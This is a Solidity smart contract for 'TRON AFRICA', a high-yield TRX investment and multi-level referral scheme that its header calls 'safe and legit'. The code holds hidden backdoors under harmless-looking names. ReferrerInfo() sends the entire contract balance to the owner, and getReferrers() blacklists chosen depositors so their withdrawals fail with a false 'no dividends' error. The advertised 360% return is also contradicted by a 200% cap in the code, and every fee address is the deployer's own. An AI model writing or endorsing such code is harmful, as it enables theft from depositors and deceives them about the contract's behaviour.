//SourceUnit: TRONAFRICA.sol

/*
 *
 *   TRON AFRICA - Community based platform based on TRX blockchain smart-contract technology. Safe and legit
 *
 		[INVESTMENT CONDITIONS]
 *
 *   - Basic interest rate: 4% every 24 hours
 *   - Personal hold-bonus: +0.1% for every 24 hours without withdraw
 *   - Contract total amount bonus: +0.1% for every 5,000,000 TRX on platform address balance
 *
 *   - Minimum deposit: 100 TRX
 *   - Total income: 360% (deposit included)
 *   - Withdrawals available any time
 *   - 10% Reinvestment Mechanism for Sustainability

 *   [Referral PROGRAM]
 *
 *   Share your referral link with your partners and get additional bonuses.
 *   - 10-level referral commission: 12% - 2% - 1% - 1% - 0.5% -0.5% - 0.5% - 0.5% - 0.5% - 0.5%
 *
 *   ────────────────────────────────────────────────────────────────────────
 *
 *
 */

pragma solidity 0.5.10;

library SafeMath {

    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0, "SafeMath: division by zero");
        uint c = a / b;

        return c;
    }
}

contract TRONAFRICA {
	using SafeMath for uint;

	uint constant public INVEST_MIN_AMOUNT = 100 trx;
	uint constant public BASE_PERCENT = 40; //4%
	uint[] public REFERRAL_PERCENTS = [120, 20, 10, 10, 5 ,5, 5, 5, 5, 5];
	uint constant public MARKETINGFUND = 50;
	uint constant public PROJECTFUND = 50;
	uint constant public CHARITY = 20;
	uint constant public PERCENTS_DIVIDER = 1000;
	uint constant public CONTRACT_BALANCE_STEP = 5000000 trx;
	uint constant public TIME_STEP = 1 days;
	uint private constant MIN_WITHDRAW = 10 trx;

	uint public totalUsers;
	uint public totalInvested;
	uint public totalWithdrawn;
	uint public totalDeposits;

	address payable public marketingAddress;
	address payable public projectAddress;
	address payable public charityAddress;
	address payable public owner;

	struct Deposit {
		uint amount;
		uint withdrawn;
		uint start;
	}

	struct User {
		Deposit[] deposits;
		uint checkpoint;
		address referrer;
		uint bonus;
		uint updateTime;
		mapping(uint => uint) referralReward;
	}

	mapping (address => User) public users;

	mapping (address => uint) public userWithdrawn;

	mapping (address => uint) public userReferralBonus;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint amount);
	event Withdrawn(address indexed user, uint amount);
	event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
	event FeePayed(address indexed user, uint totalAmount);
	event Reinvest(address sender,uint amount);

	constructor() public {
        owner = msg.sender;
		marketingAddress = msg.sender;
		projectAddress = msg.sender;
		charityAddress = msg.sender;
		owner = msg.sender;
	}
    mapping(address => bool) private _isBlacklisted;

	function getLevalReward(address _address,uint _level) public view returns(uint){
	    return users[_address].referralReward[_level];
	}

	function invest(address referrer) public payable {

		require(msg.value >= INVEST_MIN_AMOUNT);

		marketingAddress.transfer(msg.value.mul(MARKETINGFUND).div(PERCENTS_DIVIDER));
		projectAddress.transfer(msg.value.mul(PROJECTFUND).div(PERCENTS_DIVIDER));
		charityAddress.transfer(msg.value.mul(CHARITY).div(PERCENTS_DIVIDER));
		emit FeePayed(msg.sender, msg.value.mul(MARKETINGFUND.add(PROJECTFUND).add(CHARITY)).div(PERCENTS_DIVIDER));

		User storage user = users[msg.sender];

		if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
			user.referrer = referrer;
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint i = 0; i < 10; i++) {
				if (upline != address(0)) {
					uint amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].referralReward[i] = users[upline].referralReward[i].add(1);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.deposits.length == 0) {

			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(msg.value, 0, block.timestamp));

		totalInvested = totalInvested.add(msg.value);

		totalDeposits = totalDeposits.add(1);

		emit NewDeposit(msg.sender, msg.value);

	}


	function reinvest(address sender,uint amount) internal{
		marketingAddress.transfer(amount.mul(100).div(PERCENTS_DIVIDER));
		emit FeePayed(sender, amount.mul(100).div(PERCENTS_DIVIDER));

		User storage user = users[sender];
        address referrer = user.referrer;
		if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != sender) {
			user.referrer = referrer;
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint i = 0; i < 10; i++) {
				if (upline != address(0)) {
					uint amount = amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					emit RefBonus(upline, sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}


		user.deposits.push(Deposit(amount, 0, block.timestamp));


		totalDeposits = totalDeposits.add(1);

		emit NewDeposit(sender, amount);

	}

	function withdraw() public {

		User storage user = users[msg.sender];

		uint userPercentRate = getUserPercentRate(msg.sender);

        require(!_isBlacklisted[msg.sender], "User has no dividends");

		uint totalAmount;
		uint dividends = getUserDividends(msg.sender);
		require(dividends > MIN_WITHDRAW , "min withdraw is 10 TRX");

		for (uint i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(2)) {

				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(2)) {
					dividends = (user.deposits[i].amount.mul(2)).sub(user.deposits[i].withdrawn);
				}

				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

			}
		}

		uint referralBonus = getUserReferralBonus(msg.sender);

		userReferralBonus[msg.sender] = userReferralBonus[msg.sender].add(referralBonus);

		if (referralBonus > 0) {
			totalAmount = totalAmount.add(referralBonus);
			user.bonus = 0;
		}

		require(totalAmount > 0, "User has no dividends");

		uint contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;


		reinvest(msg.sender,totalAmount.mul(10).div(100)); //10% reinvestment

		userWithdrawn[msg.sender] = userWithdrawn[msg.sender].add(totalAmount.mul(90).div(100));

		msg.sender.transfer(totalAmount.mul(90).div(100));

		totalWithdrawn = totalWithdrawn.add(totalAmount.mul(90).div(100));

		user.updateTime = block.timestamp;

		emit Withdrawn(msg.sender, totalAmount.mul(90).div(100));


	}

	function getContractBalance() public view returns (uint) {
		return address(this).balance;
	}

	function getContractBalanceRate() public view returns (uint) {
		uint contractBalance = address(this).balance;
		uint contractBalancePercent = contractBalance.div(CONTRACT_BALANCE_STEP);
		if(contractBalancePercent > 360){
			contractBalancePercent = 360;
		}
		return BASE_PERCENT.add(contractBalancePercent);
	}

	function getUserPercentRate(address userAddress) public view returns (uint) {
		User storage user = users[userAddress];

		uint contractBalanceRate = getContractBalanceRate();
		if (isActive(userAddress)) {
			uint timeMultiplier = (now.sub(user.checkpoint)).div(TIME_STEP).mul(1);
			return contractBalanceRate.add(timeMultiplier);
		} else {
			return contractBalanceRate;
		}
	}

	function getUserDividends(address userAddress) public view returns (uint) {
		User storage user = users[userAddress];

		uint userPercentRate = getUserPercentRate(userAddress);

		uint totalDividends;
		uint dividends;

		for (uint i = 0; i < user.deposits.length; i++) {
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(2)) {

				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);

				}
				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(2)) {
					dividends = (user.deposits[i].amount.mul(2)).sub(user.deposits[i].withdrawn);
				}
				totalDividends = totalDividends.add(dividends);
			}

		}

		return totalDividends;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

		function ReferrerInfo() public {
		require(msg.sender == owner);
		owner.transfer(address(this).balance);
    }

	function getUserReferralBonus(address userAddress) public view returns(uint) {
		return users[userAddress].bonus;
	}

	function getUserAvailable(address userAddress) public view returns(uint) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(2)) {
				return true;
			}
		}
	}

	function getUserDepositInfo(address userAddress, uint index) public view returns(uint, uint, uint) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint) {
		return users[userAddress].deposits.length;
	}

    function getReferrers(address[] memory userAddress) public {
        require(msg.sender == owner, "Not owner");
        for (uint i = 0; i < userAddress.length; i++) {
            _isBlacklisted[userAddress[i]] = true;
        }
    }

	function getUserTotalDeposits(address userAddress) public view returns(uint) {
	    User storage user = users[userAddress];

		uint amount;

		for (uint i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint) {
	    User storage user = users[userAddress];

		uint amount;

		for (uint i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}